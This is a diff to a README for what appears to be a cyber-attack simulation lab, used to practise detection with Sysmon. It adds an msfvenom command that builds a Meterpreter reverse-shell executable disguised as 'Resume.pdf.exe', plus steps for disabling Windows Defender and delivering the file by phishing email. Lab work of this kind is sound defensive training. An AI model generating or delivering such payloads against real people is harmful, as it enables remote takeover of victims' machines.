@@ -63,31 +63,34 @@ The primary objective of this project is to simulate a cyber-attack, investigate
 
 3. **Configure Sysmon:**
 Download and configure Sysmon with an XML configuration file for detailed process monitoring.
-   - [Sysmon download link](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
-   - [Sysmon configuration file download link](https://github.com/olafhartong/sysmon-modular) 
+   - [Download Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
+   - [Download Sysmon configuration file](https://github.com/olafhartong/sysmon-modular) 
    
          ./sysmon64 -i ./config.xml -accepteula
 
 
 4. **Deactivate Windows Defender:**
-   - Temporarily disable Windows Defender to avoid interference with the simulation.
+   Temporarily disable Windows Defender to avoid interference with the simulation.
 
 ### Machine 2: Attacker (Kali Linux)
 
-1. **Network Connectivity Check:**
-   - Use the `ping` command to confirm connectivity with the victim machine.  
-     ![Screenshot of ping command]()
+1. **Network Connectivity Check:** Use the `ping` command to confirm connectivity with the victim machine.  
+     ![Screenshot of ping command](./assets/pingtest.png)
 
 2. **Reconnaissance Using Nmap:**
    - Use `nmap` to scan the victim machine for open ports, identifying potential vulnerabilities.  
-     ![Nmap scan results]()
 
-3. **Malware Creation:**
-   - Generate a malware executable with `msfvenom` using the `windows/meterpreter/reverse_tcp` payload.
+   ![Nmap scan results](./assets/nmap.png)
+
+3. **Malware Creation:** Generate a malware executable with `msfvenom` using the `windows/meterpreter/reverse_tcp` payload.
+
+         msfvenom -p windows/x64/meterpreter/reverse_tcp lhost="Your Host IP" lport=4444 -f exe -oResume.pdf.exe
+   ![malware created](./assets/msfresume.png)
 
 4. **Phishing Email:**
-   - Craft a phishing email with the malware attachment and send it to the victim.  
-     ![Screenshot of phishing email]()
+    Craft a phishing email with the malware attachment and send it to the victim.  
+
+   ![Screenshot of phishing email](./assets/mail.png)
 
 ---
 
